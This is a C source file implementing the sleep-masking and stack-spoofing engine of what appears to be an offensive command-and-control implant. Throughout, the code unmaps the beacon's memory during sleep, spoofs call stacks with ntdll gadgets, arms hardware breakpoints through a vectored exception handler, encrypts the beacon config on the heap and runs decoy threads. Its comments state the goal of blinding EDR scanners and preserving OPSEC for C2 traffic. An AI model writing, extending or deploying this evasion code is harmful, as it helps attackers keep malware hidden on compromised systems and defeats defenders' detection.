// ============================================================
// phantom_eng.c — PHANTOM Sleep Masking + Stack Spoofing Engine
//
// FRAMEWORK MODE (hero agent):
//   - Rust side: evasion/mod.rs -> secure_sleep() -> PhantomInit/PhantomSleep/PhantomDestroy
//   - Called from beacon.rs https beaconing loop via FFI (no console, no logs)
//   - P1 section phantom is created INSIDE PhantomInit with an internal stub
//     (same flow as the tested standalone build: init -> section -> sleep loop)
//
// BUILD: compiled by build.rs / build.sh into libhero_native.a (NOT a standalone exe)
//   - NO main() here — exe entry point is Rust (src/bin/hero_agent.rs)
//   - NO printf/log output — beacon runs windowed; console I/O = OPSEC fail
//
// EXECUTION FLOW (updated with P5):
//
//   PRE-SLEEP:
//     [P4] Decoy thread start   (behavioral noise)
//     [P3] VEH register         (catches HWBP single-step)
//     [P2] APC timer arm        (standard timer — APC capable)
//     [P3] HWBP arm on APC fn   (DR0 = phantom_timer_apc VA)
//     [P1] NtUnmapViewOfSection (beacon VA gone — nothing to scan)
//
//   SLEEP (spoofed):
//     [P5] phantom_spoofed_delay — pivots to heap fake stack,
//          jmps to NtDelayExecution via gadget.
//          Call stack visible to EDR:
//            ntdll!NtDelayExecution
//            ntdll!<jmp gadget>
//            <shadow space>
//            ntdll!RtlUserThreadStart
//            phantom_eng.exe!spoofed_continue  ← deep frame #5
//            kernel32!BaseThreadInitThunk
//
//     Wake paths:
//       Path A — Timer APC fires → phantom_timer_apc() → remap + SetEvent
//       Path B — HWBP fires on APC entry → VEH → SetEvent
//
//   POST-SLEEP:
//     [P1] Verify remap
//     [P3] HWBP clear + VEH remove
//     [P4] Decoy pause
//
// CRITICAL FIXES vs original:
//   1. ALL Sleep() calls replaced with direct NtDelayExecution
//      — no more KernelBase!SleepEx frames anywhere
//   2. phantom_spoofed_delay() used instead of phantom_ntdelay()
//      — call stack now shows legit ntdll/kernel32 frames
//   3. Main loop is continuous + random — no Enter key needed
//      — runs 5-15 cycles autonomously
//      — random sleep 5-15s each cycle
//      — random awake 200-700ms work
//      — random inter-cycle 300-1000ms pause
// ============================================================

#include "phantom_core.h"
#include <stdlib.h>
#include <time.h>

// Logging removed for framework build (OPSEC + windowed subsystem).
// Macro kept as no-op so call sites still document the flow.
#define LOG(f,...) ((void)0)

// P1 internal stub — placeholder code page for the section phantom.
// In framework mode the Rust beacon body lives in the main image, so the
// section carries a benign stub; the unmap/remap cycle (vanishing RX region)
// is what the scanner sees — identical to the tested standalone flow.
static BYTE PHANTOM_STUB[] = {
    0x90, 0x90, 0x90, 0x90,  // NOP sled
    0x48, 0x31, 0xC0,        // xor rax, rax
    0xC3                     // ret
};

extern PHANTOM_CTX* g_ctx;

// ─── Timer APC callback ─────────────────────────────────────
static VOID APIENTRY phantom_timer_apc(LPVOID arg, DWORD lo, DWORD hi) {
    (void)lo; (void)hi;
    PHANTOM_CTX* ctx = (PHANTOM_CTX*)arg;
    if (!ctx) return;
    if (ctx->hSection && !ctx->pMappedBase)
        phantom_section_remap(ctx);
    if (ctx->hWakeEvent)
        SetEvent(ctx->hWakeEvent);
}

// ============================================================
//  PhantomInit
// ============================================================
BOOL PhantomInit(PHANTOM_CTX* ctx) {
    if (!ctx) return FALSE;
    memset(ctx, 0, sizeof(PHANTOM_CTX));
    srand((unsigned)time(NULL) ^ GetCurrentProcessId() ^ GetTickCount());

    if (!phantom_resolve_apis(ctx)) {
        LOG("[!] NT API resolution failed");
        return FALSE;
    }

    ctx->hWakeEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
    if (!ctx->hWakeEvent) { LOG("[!] CreateEvent failed"); return FALSE; }

    ctx->hWakeTimer = CreateWaitableTimerA(NULL, FALSE, NULL);
    if (!ctx->hWakeTimer) { LOG("[!] CreateWaitableTimer failed"); return FALSE; }

    g_ctx = ctx;

    // P5: Initialize stack spoofing (gadget + RAS setup)
    // Non-fatal if this fails — code falls back to direct NtDelay
    if (phantom_init_spoof(ctx))
        LOG("[P5] Stack spoofing active — RAS + gadget ready");
    else
        LOG("[P5] Stack spoofing FAILED — using direct NtDelay (less stealthy)");

    // P6: Initialize heap encryption (beacon config buffer)
    // Non-fatal if this fails
    if (phantom_init_heap_protect())
        LOG("[P6] Heap encryption ready — beacon config protected");
    else
        LOG("[P6] Heap encryption FAILED — non-critical");

    if (!phantom_decoy_init(ctx))
        LOG("[P4] Decoy init failed — non-critical, P4 disabled");
    else
        LOG("[P4] Persistent decoy thread ready (will activate during sleep)");

    // P1: Section phantom — created here so the framework gets the SAME
    // flow that was tested standalone (init -> section -> sleep loop).
    // Non-fatal: if it fails, PhantomSleep simply skips P1 (P2-P7 still run).
    if (!phantom_section_create(ctx, PHANTOM_STUB, sizeof(PHANTOM_STUB)))
        LOG("[P1] Section create failed — P1 disabled this session");

    ctx->initialized = TRUE;
    LOG("[*] Initialized — NT APIs ready, APC timer created, spoof=%s",
        ctx->spoofReady ? "ON" : "OFF");
    return TRUE;
}

// ============================================================
//  PhantomSleep — 5-pillar orchestrated sleep
// ============================================================
BOOL PhantomSleep(PHANTOM_CTX* ctx, PHANTOM_CONFIG* cfg) {
    if (!ctx || !cfg || !ctx->initialized) return FALSE;

    DWORD actual = phantom_jitter(cfg->sleep_ms, cfg->jitter_pct);
    BOOL  ok     = TRUE;

    // ── [P4] Activate decoy ──────────────────────────────────
    if (cfg->enable_decoy) {
        phantom_decoy_start(ctx);
        LOG("[P4] Decoy thread activated (registry/FS/memstat noise)");
    }

    // ── [P3+P7] VEH — register if HWBP OR spoof enabled ─────
    // P3 uses VEH for DR0 (APC wake)
    // P7 uses VEH for DR1 (continuation redirect)
    // Must register if EITHER is enabled.
    if (cfg->enable_hwbp || (cfg->enable_spoof && ctx->spoofReady)) {
        ctx->hVeh = AddVectoredExceptionHandler(1, phantom_veh);
        if (!ctx->hVeh)
            LOG("[P3/P7] VEH register failed — HWBP + spoof disabled this cycle");
    }

    // ── [P2] Arm APC timer ───────────────────────────────────
    LARGE_INTEGER due;
    due.QuadPart = -(LONGLONG)actual * 10000LL;
    ResetEvent(ctx->hWakeEvent);

    BOOL timerOk = SetWaitableTimer(
        ctx->hWakeTimer,
        &due,
        0,
        (PTIMERAPCROUTINE)phantom_timer_apc,
        ctx,
        FALSE
    );

    if (timerOk) {
        LOG("[P2] APC timer armed — fires in %ums via phantom_timer_apc", actual);
    } else {
        LOG("[P2] SetWaitableTimer FAILED (0x%lX) — using event fallback",
            GetLastError());
    }

    // ── [P3] HWBP — arm AFTER timer, on APC entry point ──────
    if (cfg->enable_hwbp && ctx->hVeh) {
        if (phantom_hwbp_arm(ctx, (PVOID)phantom_timer_apc))
            LOG("[P3] HWBP armed: DR0 → phantom_timer_apc @ 0x%p",
                (PVOID)phantom_timer_apc);
        else
            LOG("[P3] HWBP arm failed — VEH path inactive this cycle");
    }

    // ── [P1] Unmap section — beacon VA DISAPPEARS ────────────
    if (ctx->hSection) {
        PVOID was = ctx->pMappedBase;
        if (!phantom_section_unmap(ctx)) {
            LOG("[P1] Unmap FAILED — aborting sleep (beacon stays mapped)");
            ok = FALSE; goto cleanup;
        }
        LOG("[P1] UNMAPPED: 0x%p removed from VA space — scanner blind", was);
    }

    // ── [P6] Encrypt heap config BEFORE sleep ──────────────
    // EDR heap scanner during sleep sees encrypted garbage
    phantom_encrypt_heap();

    // ── [P2+P3+P5] SLEEP — spoofed dual-path wake ────────────
    //
    // Call stack visible to scanner DURING sleep (with P5 v4 RAS):
    //   ntdll!NtDelayExecution        ← current RIP
    //   ntdll!<gadget>                ← LEGIT (slot 0)
    //   <shadow space>                ← NtDelay internal (slots 8-32)
    //   ntdll!RtlUserThreadStart      ← LEGIT (slots 40-72, fake pushed)
    //   ntdll!RtlUserThreadStart      ← was: phantom_eng (RAS replaced!)
    //   ntdll!RtlUserThreadStart      ← was: phantom_eng (RAS replaced!)
    //   ntdll!RtlUserThreadStart      ← was: phantom_eng (RAS replaced!)
    //   <all phantom_eng frames shadowed — NONE visible during sleep>
    //
    LOG("[P2] Entering spoofed sleep (v4 RAS) — %ums alertable wait", actual);
    LOG("     Scanner view: ALL ntdll frames — zero phantom_eng visible");

    if (timerOk) {
        // Primary path: spoofed alertable NtDelayExecution
        // APC will interrupt on timer fire → phantom_timer_apc → remap + SetEvent
        if (cfg->enable_spoof && ctx->spoofReady) {
            phantom_spoofed_delay(ctx, actual + 2000);
            LOG("[P5] Spoofed alertable wait returned (APC interrupted)");
        } else {
            phantom_ntdelay(ctx, actual + 2000);
            LOG("[P2] Direct alertable wait returned (APC interrupted)");
        }
    } else {
        // Timer failed — non-alertable sleep + manual remap
        LOG("[P2] Timer failed — non-alertable sleep + manual remap");
        if (cfg->enable_spoof && ctx->spoofReady)
            phantom_spoofed_delay(ctx, actual);
        else
            phantom_ntdelay(ctx, actual);
        if (ctx->hSection && !ctx->pMappedBase)
            phantom_section_remap(ctx);
        LOG("[P2] Sleep done — remap forced");
    }

    // ── [P1] Verify remap ────────────────────────────────────
    if (ctx->hSection) {
        if (!ctx->pMappedBase) {
            LOG("[P1] APC remap missed — forcing remap now");
            phantom_section_remap(ctx);
        }
        LOG("[P1] REMAPPED: beacon at 0x%p — scanner can see again",
            ctx->pMappedBase);
    }

    // ── [P6] Decrypt heap config AFTER wake ─────────────────
    // Beacon needs config readable again for C2 communication
    phantom_decrypt_heap();

cleanup:
    // ── [P3+P7] Disarm — clear DR0, DR1, remove VEH ─────────
    if (cfg->enable_hwbp || (cfg->enable_spoof && ctx->spoofReady)) {
        phantom_hwbp_clear(ctx);      // Clear DR0 (P3)
        phantom_p7_clear_hwbp(ctx);   // Clear DR1 (P7 — safety, already cleared by VEH)
        if (ctx->hVeh) {
            RemoveVectoredExceptionHandler(ctx->hVeh);
            ctx->hVeh = NULL;
            LOG("[P3/P7] HWBP cleared (DR0+DR1), VEH removed");
        }
    }
    // ── [P4] Decoy pause ─────────────────────────────────────
    if (cfg->enable_decoy)
        phantom_decoy_pause(ctx);

    return ok;
}

// ============================================================
//  PhantomDestroy
// ============================================================
void PhantomDestroy(PHANTOM_CTX* ctx) {
    if (!ctx) return;
    phantom_section_destroy(ctx);
    phantom_decoy_destroy(ctx);
    phantom_destroy_spoof(ctx);       // P5: cleanup spoofing globals
    phantom_destroy_heap_protect();   // P6: free + zero config buffer
    if (ctx->hWakeTimer) {
        CancelWaitableTimer(ctx->hWakeTimer);
        CloseHandle(ctx->hWakeTimer); ctx->hWakeTimer = NULL;
    }
    if (ctx->hWakeEvent) { CloseHandle(ctx->hWakeEvent); ctx->hWakeEvent = NULL; }
    if (ctx->hVeh) { RemoveVectoredExceptionHandler(ctx->hVeh); ctx->hVeh = NULL; }
    g_ctx = NULL;
    memset(ctx, 0, sizeof(PHANTOM_CTX));
    LOG("[*] Destroyed — all handles closed, P5+P6 cleaned up");
}
